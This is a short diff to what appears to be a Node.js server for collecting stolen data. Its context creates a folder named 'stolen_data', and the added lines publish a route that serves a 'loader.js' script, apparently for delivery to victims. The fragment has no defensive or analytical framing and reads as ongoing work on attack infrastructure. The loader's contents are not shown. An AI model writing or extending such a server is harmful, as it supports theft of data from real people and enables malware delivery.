@@ -11,6 +11,9 @@ const DATA_FOLDER = path.join(__dirname, 'stolen_data');
 if (!fs.existsSync(DATA_FOLDER)) {
     fs.mkdirSync(DATA_FOLDER, { recursive: true });
 }
+app.get('/loader.js', (req, res) => {
+  res.sendFile(path.join(__dirname, 'loader.js'));
+});
 
 console.log(`🚀 Server starting on port ${PORT}`);
 
